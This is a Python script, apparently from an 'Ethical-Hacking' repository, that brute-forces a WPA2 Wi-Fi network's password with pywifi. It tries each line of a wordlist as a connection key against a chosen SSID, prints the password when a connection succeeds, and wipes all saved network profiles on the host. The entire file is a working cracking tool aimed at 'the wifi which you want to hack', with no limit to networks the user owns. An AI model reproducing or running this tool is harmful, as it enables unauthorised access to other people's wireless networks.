# https://medium.com/analytics-vidhya/wifi-hacking-using-pywifi-4f90ed9b1a2
###############################################################################################################

# Github Repo For Hacking Stuff --> https://github.com/r-sajal/Ethical-Hacking/

###############################################################################################################
# Importing General Libraries
import logging
import os, os.path, platform
import sys
import time

# Importing pywifi library
from pywifi import const
from pywifi import Profile

import colorama

from helpers.parser import get_argument_parser

colorama.init()

import helpers.wifi
from helpers.constants import *

# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file

# client_ssid = "Dfone"
# path_to_file = "data/wifi-passwords.txt"
# path_to_file = "data/passwords.txt"

################################################################################

# noinspection PyArgumentList
logging.basicConfig(
    level=logging.ERROR,
    format="%(levelname)s | %(message)s",
    stream=sys.stdout,
    force=True,
)


# logging.getLogger('pywifi').setLevel(logging.NOTSET)

# type = False

def crack_password(ssid, password, number, verbose=False):
    profile = Profile()  # create profile instance
    profile.ssid = ssid  # name of client
    profile.auth = const.AUTH_ALG_OPEN  # auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
    profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
    profile.key = password  # use generated password

    print(DARK_GREEN)
    print(PLUS, "total network profiles: ", len(wifi.iface.network_profiles()))
    print(PLUS, "remove_all_network_profiles")
    wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
    print(PLUS, "total network_profiles: ", len(wifi.iface.network_profiles()))

    print(GREEN)
    print(PLUS, "creating profile:")
    tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile

    if verbose:
        print(DARK_GREEN)
        for var in vars(tmp_profile):
            print(f"{var:15}: {getattr(tmp_profile, var)}")

    time.sleep(1)  # if script not working change time to 1 !!!!!!
    print(GREEN)
    print(PLUS, "connecting...")
    wifi.iface.connect(tmp_profile)  # trying to Connect
    time.sleep(1)  # 1s

    if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        wifi.iface.disconnect()
        time.sleep(1)
        exit()
    else:
        print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))


# opening and reading the file
def crack_loop(ssid, file, verbose=False):
    print(YELLOW)
    print(TILDE, "Cracking...")
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            print(GREEN)
            print(f"[{number}] Trying {ssid} with {pwd}")
            crack_password(ssid, pwd, number, verbose=False)


def menu(client_ssid, path_to_file):
    parser = get_argument_parser()
    args = parser.parse_args()

    print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(1.5)

    ssid = args.ssid
    filee = args.file
    verbose = args.verbose

    # breaking
    if os.path.exists(filee):
        # pass
        #     if platform.system().startswith("Win" or "win"):
        #         os.system("cls")
        #     else:
        #         os.system("clear")
        print(CYAN, PLUS, f"ssid: {ssid}")
        print(CYAN, PLUS, f"file: {filee}", RESET)
        return ssid, filee, verbose
    else:
        print(LIGHT_RED, MINUS, f"No Such File: {filee}, terminating", RESET)
        exit()


if __name__ == '__main__':
    # Main function call
    ssid, filee, verbose = menu(client_ssid="", path_to_file="")
    wifi = helpers.wifi.Wifi(verbose)
    crack_loop(ssid, filee, verbose)

###########################################################################################################################################################
# END OF FILE

# Code by Sajal Rastogi

###########################################################################################################################################################
